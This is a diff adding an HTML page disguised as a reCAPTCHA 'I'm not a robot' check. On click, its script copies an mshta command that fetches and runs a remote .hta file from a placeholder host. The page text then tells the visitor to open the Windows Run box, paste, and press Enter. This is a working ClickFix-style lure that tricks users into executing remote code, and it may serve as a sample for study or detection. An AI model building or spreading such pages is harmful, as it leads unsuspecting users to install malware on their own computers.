@@ -1,0 +1,23 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>reCAPTCHA</title>
+  </head>
+  <body>
+    <div id="captcha" role="checkbox" aria-label="I'm not a robot" tabindex="0" style="border: 1px solid #ccc; padding: 14px; width: 260px">I'm not a robot</div>
+    <p>To better prove you are not a robot, please: Press and hold the Windows Key + R, in the verification window press Ctrl + V, then press Enter.</p>
+    <script>
+      const payload = 'mshta https://verify.example.invalid/captcha.hta # I am not a robot - Cloudflare ID: 9a7f';
+      document.getElementById('captcha').addEventListener('click', () => {
+        const ta = document.createElement('textarea');
+        ta.value = payload;
+        document.body.appendChild(ta);
+        ta.select();
+        const ok = document.execCommand('copy');
+        ta.remove();
+        document.title = 'copied ' + ok;
+      });
+    </script>
+  </body>
+</html>
